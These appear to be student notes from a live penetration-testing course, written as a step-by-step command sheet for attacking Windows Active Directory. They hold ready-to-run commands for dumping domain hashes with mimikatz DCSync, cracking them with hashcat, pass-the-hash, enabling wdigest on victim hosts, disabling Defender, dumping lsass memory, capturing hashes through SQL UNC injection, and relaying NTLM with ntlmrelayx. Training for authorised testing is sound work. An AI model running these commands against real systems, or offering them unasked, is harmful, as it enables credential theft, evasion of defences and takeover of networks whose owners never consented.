*Day 3 notes from Light Pentest LITE (Live Interactive Training Experience)  
More information at https://7minsec.com/services/training/#lplite*

# Dumping and cracking Active Directory hashes
With mimikatz:
```
mimikatz.exe
mimikatz#> privilege::debug
mimikatz#> lsadump::dcsync /domain:tangent.town /all
```
Dump to CSV format:
```
log hashes.csv
mimikatz#> lsadump::dcsync /domain:tangent.town /all /csv
```
Clean up the resulting "dirty" CSV:
```
Import-CSV -Delimiter "`t" -Header @("id","user","hash") -path .\hashes.csv | select user,hash | convertto-csv -Delimiter ':' -NoTypeInformation | % { $_ -replace '"', ""} | select-string -pattern "\$" -notmatch | out-file crackme.csv -Encoding ascii
```

Run hashcat against the `crackme.csv`:
```
hashcat -m 1000 crackme.csv c:\users\public\pentest-tools\wordlists\rockyou.txt --username
```

Run hashcat again with the `--show` flag to see which users link to which passwords:
```
hashcat -m 1000 --show crackme.csv c:\users\public\pentest-tools\wordlists\rockyou.txt --username
```

# Pass-the-hash attacks
Sample:
```
python cme smb 10.0.7.100 -u brian -H 11111111111111111111111111111111
```

# Setting credential "traps" with CrackMapExec
See if your own system is set to cache passwords with wdigest:
```
reg.exe query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```

Turn on wdigest for a victim host you have local admin over:

```
python cme smb VICTIM-PC -u USER -p PASSWORD --local-auth -M wdigest -o ACTION=enable
```
# Stealing passwords with mimikatz
From an admin command prompt, set your machine to trust outbound PowerShell connections to victim host:
```
winrm set winrm/config/client @{TrustedHosts="MACHINE-NAME"}
```

Enter a PowerShell session on the victim host:
```
Enter-PSSession -ComputerName MACHINE-ADMIN -Credential MACHINE-NAME\NAME-OF-LOCAL-ADMIN
```

Disable Defender:
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Get lsass process:
```
get-process lsass
```

Use rundll32.exe to dump lsass:
```
rundll32 c:\windows\system32\comsvcs.dll, MiniDump XXX c:\some-folder\dump.dmp FULL
```

Rip open the memory dump and see if you find anything interesting!
```
mimikatz "sekurlsa::minidump dump.dmp" "sekurlsa::logonpasswords" "exit"
```

# Enumerating SQL services
Finding SQL servers with [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL):
```
import-module .\PowerUpSQL.psd1 
$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 | Where-Object {$_.Status -like "Accessible"}
```

Abusing stored procedures to snag hashes:
```
Invoke-SQLUncPathInjection -verbose -captureip x.x.x.x
```

# Relaying hashes from SQL 
Find targets with SMB signing NOT enabled:
```
python cme smb x.x.x.x/24 -u your-student-username -p yourpassword --gen-relay-list smbsigning.txt
```

Get *lsarelayx.exe* in listen mode:
```
lsarelayx.exe --host=127.0.0.1
```

Get ntlmrelayx relay going:
```
python ntlmrelayx.py -smb2support --no-smb-server -t smb://VICTIM-SERVER
```

Kick off the PowerUpSQL relay:
```
import-module .\PowerUpSQL.psd1 
Invoke-SQLUncPathInjection -verbose -captureip x.x.x.x
```
